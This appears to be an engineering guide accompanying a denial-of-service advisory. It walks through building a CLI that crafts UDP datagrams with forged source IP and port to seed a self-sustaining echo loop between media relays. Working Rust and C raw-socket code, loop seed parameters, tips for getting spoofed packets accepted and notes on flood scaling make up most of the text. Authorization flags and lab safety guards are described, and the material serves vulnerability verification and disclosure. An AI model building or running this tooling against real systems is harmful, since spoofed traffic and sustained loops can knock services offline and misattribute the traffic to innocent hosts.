# ZUDP-2026-001 — UDP source-spoofing CLI: implementation guide (Rust / C++)

> **Companion to `ZUDP-2026-001-sleep-dos.md`.** That advisory describes the
> vulnerability and the measurement methodology. **This file is the low-level
> engineering guide** for building a small CLI that crafts UDP datagrams with an
> **arbitrary source IP and source port**, used to empirically verify the echo-loop
> (advisory §3.3) before investing in the full flood/probe harness.
>
> **Authorized lab use only.** Source-IP spoofing off an isolated network is illegal on
> shared infrastructure. Every guard in §7 is mandatory. Do not point a loop at any host
> you cannot forcibly reset.

---

## 1. Goal

A CLI that can:

1. **`send`** — emit one or more UDP packets with a fully attacker-chosen
   `(src_ip, src_port, dst_ip, dst_port, payload)`.
2. **`loop`** — seed the echo loop (advisory §3.3) in two presets:
   - **A↔B**: seed `src=B:4200 → dst=A:4200` (and/or the mirror) so the two relays echo
     each other.
   - **self**: seed `src=A:4200 → dst=A:4200` so a single relay loops on itself.
3. After seeding, **stop transmitting** and let §6 verification confirm whether the loop
   sustains unattended (the key evidence).

The payload for loop verification is **3 bytes** (must be in `1..=4` to hit the
vulnerable branch), and the crafted **source port must be `4200`** so echoes land on a
bound media socket. Both are free header fields (see §3).

---

## 2. Platform & privilege prerequisites

| Requirement | Detail |
|---|---|
| **OS** | **Linux.** Windows blocks raw spoofed UDP since XP SP2 — only L2 injection via Npcap works there; not covered here. |
| **Privilege** | `CAP_NET_RAW`. Grant per-binary: `sudo setcap cap_net_raw+ep ./udp-spoof` (avoids running as full root). |
| **Network** | A segment **without** anti-spoofing. Cloud VMs (AWS/GCP/Azure) drop spoofed egress at the virtual switch regardless of `CAP_NET_RAW` → use bare metal or a controlled lab L2. This is independent of ISP BCP38. |
| **Containers** | Docker needs `--cap-add=NET_RAW` (usually default) or `--privileged`. |

If spoofing is blocked by the fabric, **non-spoofed** parts of the PoC (reuseport spray,
per-thread stall) still work with ordinary sockets and no special privilege — only the
loop/reflection variants need spoofing.

---

## 3. Why src IP and src port are both free fields

- The IP header's **source address** and the UDP header's **source port** are values the
  sender writes. Nothing in UDP/IP verifies them (no handshake, unlike TCP).
- Setting **src port** needs no special privilege at all when crafting (it is just two
  bytes you write) — and even with a normal socket you can `bind()` a chosen local port.
- Setting **src IP ≠ your interface address** requires a **raw socket with `IP_HDRINCL`**
  so you supply the whole IP header; otherwise the kernel overwrites the source with the
  egress interface address.

---

## 4. Packet-crafting mechanics (the gotchas)

1. **`IP_HDRINCL`** — enable it so the kernel does not build/overwrite the IP header.
   (pnet's Layer3 channel does this for you.)
2. **Checksums:**
   - **IPv4 header checksum** — compute it (Linux often fills it, but compute to be safe).
   - **UDP checksum** — you must compute it over the **pseudo-header**
     (src_ip, dst_ip, proto=17, udp_len) + UDP header + payload. A wrong checksum is
     dropped **silently** by the receiver — the #1 cause of "it doesn't work".
     - **IPv4:** UDP checksum is optional; you may set it to **0** to skip. Fine for this PoC.
     - **IPv6:** UDP checksum is **mandatory**; `0` is illegal — must be computed.
3. **Byte order** — ports, lengths, checksums are network byte order (big-endian). Header
   builders (pnet/etherparse) handle this; hand-rolled C must `htons`/`htonl`.
4. **Lengths** — IP `total_length` = 20 + 8 + payload; UDP `length` = 8 + payload.
5. **Verify on the wire** — always confirm with `tcpdump` (§6) before concluding anything.

---

## 5. Implementation

### 5.1 Rust (primary) — crates

| Purpose | Crate |
|---|---|
| Raw L3 send + header builders | `pnet` (`pnet::transport`, `pnet::packet::{ipv4,udp}`) |
| Non-spoof sockets / options | `socket2` |
| CLI | `clap` (derive) |
| (Optional) hand parsing | `etherparse` |

`Cargo.toml`:
```toml
[dependencies]
pnet = "0.35"
clap = { version = "4", features = ["derive"] }
```

Core: build a spoofed IPv4/UDP packet and send it via a Layer3 channel.

```rust
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::{MutableIpv4Packet, checksum as ipv4_checksum};
use pnet::packet::udp::{MutableUdpPacket, ipv4_checksum as udp_ipv4_checksum};
use pnet::packet::Packet;
use pnet::transport::TransportChannelType::Layer3;
use pnet::transport::transport_channel;
use std::net::Ipv4Addr;

/// Craft and send ONE spoofed IPv4/UDP datagram.
fn send_spoofed(
    src_ip: Ipv4Addr, src_port: u16,
    dst_ip: Ipv4Addr, dst_port: u16,
    payload: &[u8],
) -> std::io::Result<()> {
    const IP_HDR: usize = 20;
    const UDP_HDR: usize = 8;
    let total = IP_HDR + UDP_HDR + payload.len();
    let mut buf = vec![0u8; total];

    // ---- IPv4 header ----
    {
        let mut ip = MutableIpv4Packet::new(&mut buf).unwrap();
        ip.set_version(4);
        ip.set_header_length(5);              // 5 * 4 = 20 bytes
        ip.set_total_length(total as u16);
        ip.set_ttl(64);
        ip.set_next_level_protocol(IpNextHeaderProtocols::Udp);
        ip.set_source(src_ip);                // <-- spoofed
        ip.set_destination(dst_ip);
        let c = ipv4_checksum(&ip.to_immutable());
        ip.set_checksum(c);
    }
    // ---- UDP header + payload ----
    {
        let mut udp = MutableUdpPacket::new(&mut buf[IP_HDR..]).unwrap();
        udp.set_source(src_port);             // <-- e.g. 4200
        udp.set_destination(dst_port);
        udp.set_length((UDP_HDR + payload.len()) as u16);
        udp.set_payload(payload);
        // pseudo-header checksum (or set 0 to skip on IPv4)
        let c = udp_ipv4_checksum(&udp.to_immutable(), &src_ip, &dst_ip);
        udp.set_checksum(c);
    }

    let (mut tx, _rx) = transport_channel(4096, Layer3(IpNextHeaderProtocols::Udp))?;
    let pkt = MutableIpv4Packet::new(&mut buf).unwrap();
    tx.send_to(pkt.to_immutable(), std::net::IpAddr::V4(dst_ip))?;
    Ok(())
}
```

Loop presets are just parameterizations of `send_spoofed`:
```rust
// A <-> B : make A think a 3-byte packet came from B:4200
send_spoofed(b_ip, 4200, a_ip, 4200, &[0u8; 3])?;
// self-loop on A
send_spoofed(a_ip, 4200, a_ip, 4200, &[0u8; 3])?;
```

### 5.2 C++ (fallback) — raw socket + IP_HDRINCL

```c
int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);   // needs CAP_NET_RAW
int on = 1;
setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));

// buf = [ struct iphdr | struct udphdr | payload ]
// iph.saddr = spoofed; iph.daddr = dst; iph.protocol = IPPROTO_UDP;
// iph.tot_len = htons(20 + 8 + plen); iph.ihl = 5; iph.version = 4; iph.ttl = 64;
// iph.check = ip_checksum(&iph, 20);
// udph.source = htons(4200); udph.dest = htons(4200);
// udph.len = htons(8 + plen);
// udph.check = 0;   // IPv4: 0 = skip; or compute via pseudo-header
struct sockaddr_in dst = { .sin_family = AF_INET, .sin_addr.s_addr = daddr };
sendto(fd, buf, 20 + 8 + plen, 0, (struct sockaddr*)&dst, sizeof(dst));
```

Both languages hit the **same** OS constraints (§2); Rust removes none of them.

### 5.3 CLI surface (clap)

```
udp-spoof --i-have-authorization <SUBCOMMAND>

  send   --src-ip <IP> --src-port <P> --dst-ip <IP> --dst-port <P>
         [--payload-len 3] [--count 1]

  loop   --mode <a-b|self> --a <IP> [--b <IP>] [--port 4200]
         [--seeds 1] [--observe-secs 30]
```

- Global `--i-have-authorization` gates all sending.
- `loop` emits `--seeds` packets then stops and prints a reminder to watch `tcpdump`
  (§6) for persistence.

---

## 6. Verification — does the loop actually run?

1. **On both peers (or the single self-loop host), capture:**
   ```
   sudo tcpdump -ni any 'udp port 4200' -ttt
   ```
2. **Seed once** with the CLI (`--seeds 1`), then **stop the CLI entirely.**
3. **Expected if the loop sustains:** `tcpdump` keeps showing 3-byte UDP packets
   ping-ponging between `A:4200 ↔ B:4200` (or `A:4200 → A:4200`) **after** the CLI has
   exited. Packet count should stay elevated / grow before buffer-drop steady state.
4. **Quantify persistence** (feeds advisory §10.5): measure how many seconds the loop
   survives unattended, and the sustained pps. That number sets the attacker's re-seed
   rate.
5. **Break the loop** when done: flush the buffers by stopping/restarting the relay
   process, or drop the port with a firewall rule:
   ```
   sudo iptables -A INPUT  -p udp --dport 4200 -j DROP
   sudo iptables -A OUTPUT -p udp --sport 4200 -j DROP
   ```

**Negative-result debugging** (loop does not start):
- Wrong/again-computed **UDP checksum** → receiver drops silently. Try checksum `0` (IPv4).
- Forgot **`IP_HDRINCL`** / not using Layer3 → source not actually spoofed (check tcpdump
  source field).
- **Cloud/hypervisor anti-spoof** dropping egress → move to bare-metal lab.
- Source port **≠ a bound port** → echo hits a closed port → ICMP unreachable, no loop.

---

## 7. Safety guards (mandatory)

- Hard `--i-have-authorization` flag; refuse to send without it.
- Enforce caps: `--seeds` small by default; a max-packets ceiling compiled in.
- Restrict to lab targets: optionally hardcode an allowlist of destination IPs.
- Keep the loop's port firewalled from any system you do not own.
- Have an out-of-band way (console/SSH on a different port) to reset the relay — a running
  loop can peg the box.
- Log every invocation (operator, target, params, timestamp).

---

## 8. Performance note (only if scaling beyond verification)

The `send`/`loop` verification tool is low-rate by design. The high-rate **flood** used
for the dose–response curve (advisory §8–§9) does **not** need spoofing and should use
ordinary UDP sockets with a source-port pool; if raw-socket line-rate is ever needed,
move to `sendmmsg`, `AF_PACKET` + `PACKET_MMAP`, or `AF_XDP` — but that is out of scope
for verifying the loop.

---

## 9. References

- Advisory: `ZUDP-2026-001-sleep-dos.md` (§3.3 echo loop, §8–§9 harness, §10.5 loop cost,
  §12 safety).
- `man 7 raw`, `man 7 packet`, `man setcap`.
- pnet transport/packet docs.
